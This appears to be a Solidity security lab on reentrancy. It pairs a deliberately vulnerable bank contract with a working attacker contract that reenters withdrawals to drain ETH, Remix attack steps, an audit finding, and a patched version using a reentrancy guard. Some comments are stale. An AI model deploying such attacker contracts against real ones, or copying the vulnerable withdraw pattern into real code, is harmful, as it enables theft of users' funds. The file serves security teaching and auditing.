// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Call malicious contract
CONCEPT: Attack surface
=========================================================

OBJECTIVE

- Learn dangers of external contract calls
- Understand malicious-contract behavior
- Learn reentrancy attack surface
- Think like attacker + auditor

---------------------------------------------------------
CORE IDEA
---------------------------------------------------------

Every external contract call is:
UNTRUSTED EXECUTION.

---------------------------------------------------------
IMPORTANT UNDERSTANDING
---------------------------------------------------------

When your contract calls another contract:

CONTROL temporarily leaves your contract.

---------------------------------------------------------

The called contract may:
- revert
- reenter
- consume gas
- manipulate logic
- attack state assumptions

---------------------------------------------------------
WHY THIS MATTERS
---------------------------------------------------------

Most major Solidity hacks involve:

external contract interactions.

---------------------------------------------------------
REAL-WORLD USAGE
---------------------------------------------------------

External calls occur in:

- ERC20 interactions
- swaps
- lending
- bridges
- staking
- governance execution

---------------------------------------------------------
AUDITOR FOCUS
---------------------------------------------------------

Auditors inspect:

- reentrancy windows
- trust assumptions
- call ordering
- arbitrary external execution
- unchecked return values

=========================================================
VICTIM CONTRACT
=========================================================
*/

contract VictimBankval {

    /*
        USER BALANCES
    */
    mapping(address => uint256) public balances;

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()
        external
        payable
    {

        balances[msg.sender] += msg.value;
    }

    /*
    =====================================================
    SAFE WITHDRAW
    =====================================================
    */

    function safeWithdraw(
        uint256 _amount
    )
        external
    {

        /*
            CHECK
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            EFFECTS:
            Update storage FIRST.
        */
        balances[msg.sender] -= _amount;

        /*
            INTERACTION:
            External ETH transfer LAST.
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    External call BEFORE state update.
    */

    function vulnerableWithdraw(
        uint256 _amount
    )
        external
    {

        /*
            Validate balance.
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            DANGEROUS:
            External call FIRST.
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        /*
            STATE UPDATED TOO LATE.
        */
        balances[msg.sender] -= _amount;
    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    */

    function contractBalance()
        external
        view
        returns (uint256)
    {

        return address(this).balance;
    }
}

/*
=========================================================
MALICIOUS ATTACKER CONTRACT
=========================================================
*/

contract MaliciousAttackerval {

    /*
        TARGET VICTIM CONTRACT
    */
    VictimBank public victim;

    /*
        TRACK ATTACK COUNT
    */
    uint256 public attackCounter;

    /*
        OWNER
    */
    address public owner;

    /*
        ATTACK LIMIT
    */
    uint256 public constant MAX_ATTACKS = 3;

    /*
        CONSTRUCTOR
    */
    constructor(address _victim)
    {

        victim = VictimBank(_victim);

        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO VICTIM
    =====================================================
    */

    function depositToVictim()
        external
        payable
    {

        /*
            Deposit ETH into victim contract.
        */
        victim.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack()
        external
    {

        /*
            Trigger vulnerable withdraw.
        */
        victim.vulnerableWithdraw(
            1 ether
        );
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Executes automatically
    when victim sends ETH.
    */

    receive()
        external
        payable
    {

        /*
            Reentrancy trigger.
        */
        if (
            address(victim).balance >= 1 ether
            &&
            attackCounter < MAX_ATTACKS
        ) {

            attackCounter++;

            /*
                REENTER victim contract.

                Balance NOT reduced yet.
            */
            victim.vulnerableWithdraw(
                1 ether
            );
        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    */

    function withdrawLoot()
        external
    {

        require(
            msg.sender == owner,
            "Not owner"
        );

        payable(owner).transfer(
            address(this).balance
        );
    }
}

/*
=========================================================
ATTACK FLOW
=========================================================

STEP 1:
Deploy VictimBank

---------------------------------------------------------

STEP 2:
Fund VictimBank with ETH

=========================================================
STEP 3
=========================================================

Deploy MaliciousAttacker

Constructor input:
VictimBank address

=========================================================
STEP 4
=========================================================

Call:
depositToVictim()

VALUE:
1 ETH

---------------------------------------------------------

Attacker now has:
1 ETH balance in victim.

=========================================================
STEP 5
=========================================================

Call:
attack()

---------------------------------------------------------

Execution enters:

victim.vulnerableWithdraw()

=========================================================
CRITICAL VULNERABILITY
=========================================================

Victim executes:

call{value: 1 ether}()

BEFORE reducing balance.

---------------------------------------------------------

CONTROL transfers to:
MaliciousAttacker.receive()

=========================================================
INSIDE ATTACKER receive()
=========================================================

receive() executes automatically.

---------------------------------------------------------

Attacker checks:

victim still has ETH?

---------------------------------------------------------

YES

---------------------------------------------------------

Attacker REENTERS:

victim.vulnerableWithdraw()

=========================================================
IMPORTANT
=========================================================

Victim storage NOT updated yet.

---------------------------------------------------------

balances[attacker]
still unchanged.

---------------------------------------------------------

Attacker withdraws repeatedly.

=========================================================
FINAL RESULT
=========================================================

Attacker drains victim ETH.

=========================================================
WHY THIS HAPPENS
=========================================================

BAD ORDER:

interaction BEFORE effects.

---------------------------------------------------------

Classic reentrancy vulnerability.

=========================================================
REMIX TESTING
=========================================================

STEP 1:
Deploy VictimBank

---------------------------------------------------------

STEP 2:
Deposit multiple ETH into victim

---------------------------------------------------------

STEP 3:
Deploy MaliciousAttacker

Input:
VictimBank address

---------------------------------------------------------

STEP 4:
Call:
depositToVictim()

VALUE:
1 ETH

---------------------------------------------------------

STEP 5:
Call:
attack()

---------------------------------------------------------

STEP 6:
Observe:

Victim ETH decreases heavily.

---------------------------------------------------------

STEP 7:
Call:
attackCounter()

EXPECTED:
Multiple attack rounds

=========================================================
IMPORTANT SECURITY CONCEPT
=========================================================

External contracts are:
UNTRUSTED.

---------------------------------------------------------

Never assume:
called contracts behave safely.

=========================================================
COMMON AUDIT RISKS
=========================================================

---------------------------------------------------------
1. REENTRANCY
---------------------------------------------------------

Most famous Solidity vulnerability.

---------------------------------------------------------
2. ARBITRARY EXECUTION
---------------------------------------------------------

External contracts control execution flow.

---------------------------------------------------------
3. DOS VIA REVERT
---------------------------------------------------------

Malicious contract may always revert.

---------------------------------------------------------
4. GAS GRIEFING
---------------------------------------------------------

Malicious contract consumes excessive gas.

=========================================================
CHECKS-EFFECTS-INTERACTIONS
=========================================================

SAFE PATTERN:

1. CHECKS
2. EFFECTS
3. INTERACTIONS

---------------------------------------------------------

safeWithdraw() follows this correctly.

=========================================================
VERY IMPORTANT AUDITOR MINDSET
=========================================================

Auditors NEVER trust:
external contracts.

---------------------------------------------------------

Every external interaction =
potential attack surface.

=========================================================
ATTACK THINKING
=========================================================

Attackers search for:

- external calls
- state updates after calls
- reentrancy windows
- unchecked return values

---------------------------------------------------------

Then:
build malicious contracts to exploit.

=========================================================
REAL AUDITOR PROCESS
=========================================================

Auditors trace:

1. External interaction timing
2. Storage update order
3. Reentrancy possibilities
4. ETH transfer behavior
5. Cross-contract execution flow

=========================================================
MINI CHALLENGE
=========================================================

Modify VictimBank so that:

1. Add nonReentrant modifier
2. Block reentrancy attack
3. Add event logging
4. Compare safe vs vulnerable execution

BONUS:
Create ERC20-style malicious token attack.

=========================================================
IMPORTANT CONCEPTS LEARNED
=========================================================

- External contracts are untrusted
- call() transfers execution control
- Reentrancy exploits bad ordering
- receive()/fallback() can attack automatically
- CEI pattern improves security
- External calls create attack surface
- Malicious contracts manipulate execution flow
- Auditors inspect every external interaction
- Reentrancy is one of Solidity's biggest risks
- Cross-contract execution is security critical

=========================================================
*/
/*
Title: Reentrancy vulnerability in vulnerableWithdraw()

Severity: Critical

Reason: An attacker can repeatedly withdraw funds before their balance is updated, leading to theft of ETH from the contract

Location: Contract: Victimbank
          Function: vulnerableWithdraw(uint256 _amount)

Vulnerability Description: The vulnerableWithdraw() function performs an external call to msg.sender before updating the user's balance
(bool success, ) =
    payable(msg.sender).call{
        value: _amount
    }("");

- Because the user's balance is not reduced before the external call, a malicious contract can use its receive() function to re-enter vulnerableWithdraw() multiple times.

- Each reentrant call passes the balance check because the storage variable has not yet been updated

- This allows an attacker to withdraw more ETH than they actually deposited

Impact: An attacker can drain ETH from the contract

Possible consequences include
- Theft of deposited user funds
- Complete contract balance drain
- Financial loss for all users
- Protocol insolvency

Proof of Concept:
1. Deploy VictimBank
2. Deposit 10 ETH from honest users
3. Deploy MaliciousAttacker with the victim contract address
4. Deploy 1 ETH through depositToVictim()
5. Call: attack();
6. The victim sends 1 ETH to the attacker
7. The attacker's receive() function executes
8. The attacker re-enters: victim.vulnerableWithdraw(1 ether);
9. Multiple withdrawals occur before the balance is updated
10. The attacker drains additional ETH from the contract

Root Cause: The contract violates the Check-Effects-Interactions pattern
Current execution order
1. Check balance
2. External call
3. Update balance.
The state update occurs after control is transferred to an untrusted external contract

Recommendation: Apply multiple defenses
- Use the Check-Effects-Interactions pattern
- Add a nonReentrant modifier
- Update storage before external calls
- Log deposits and withdrawals using events


*/

// PATCHED CODE

contract VictimBank {

    /*
        USER BALANCES
    */
    mapping(address => uint256) public balances;

    // REENTRANCY GUARD
    bool private locked;

    // EVENT
    event Deposit(address indexed user, uint256 amount);

    event Withdraw(address indexed user, uint256 amount, string method);

    // NON-REETRANT MODIFIER
    modifier nonReentrant()
    {
        require(!locked, "Reentrancy detected");

        locked = true; _;

        locked = false;
    }

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()
        external
        payable
    {

        balances[msg.sender] += msg.value;

        emit Deposit(msg.sender, msg.value);
    }

    /*
    =====================================================
    SAFE WITHDRAW
    =====================================================
    */

    function safeWithdraw(
        uint256 _amount
    )
        external
        nonReentrant
    {

        /*
            CHECK
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            EFFECTS:
            Update storage FIRST.
        */
        balances[msg.sender] -= _amount;

        /*
            INTERACTION:
            External ETH transfer LAST.
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        emit Withdraw(msg.sender, _amount, "SAFE");
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    External call BEFORE state update.
    */

    function vulnerableWithdraw(
        uint256 _amount
    )
        external
        nonReentrant
    {

        /*
            Validate balance.
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        balances[msg.sender] -= _amount;

        /*
            DANGEROUS:
            External call FIRST.
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        emit Withdraw(msg.sender, _amount, "PATCHED");

    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    */

    function contractBalance()
        external
        view
        returns (uint256)
    {

        return address(this).balance;
    }
}

/*
=========================================================
MALICIOUS ATTACKER CONTRACT
=========================================================
*/

contract MaliciousAttacker {

    /*
        TARGET VICTIM CONTRACT
    */
    VictimBank public victim;

    /*
        TRACK ATTACK COUNT
    */
    uint256 public attackCounter;

    /*
        OWNER
    */
    address public owner;

    /*
        ATTACK LIMIT
    */
    uint256 public constant MAX_ATTACKS = 3;

    /*
        CONSTRUCTOR
    */
    constructor(address _victim)
    {

        victim = VictimBank(_victim);

        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO VICTIM
    =====================================================
    */

    function depositToVictim()
        external
        payable
    {

        /*
            Deposit ETH into victim contract.
        */
        victim.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack()
        external
    {

        /*
            Trigger vulnerable withdraw.
        */
        victim.vulnerableWithdraw(
            1 ether
        );
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Executes automatically
    when victim sends ETH.
    */

    receive()
        external
        payable
    {

        /*
            Reentrancy trigger.
        */
        if (
            address(victim).balance >= 1 ether
            &&
            attackCounter < MAX_ATTACKS
        ) {

            attackCounter++;

            /*
                REENTER victim contract.

                Balance NOT reduced yet.
            */
            victim.vulnerableWithdraw(
                1 ether
            );
        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    */

    function withdrawLoot()
        external
    {

        require(
            msg.sender == owner,
            "Not owner"
        );

        payable(owner).transfer(
            address(this).balance
        );
    }
}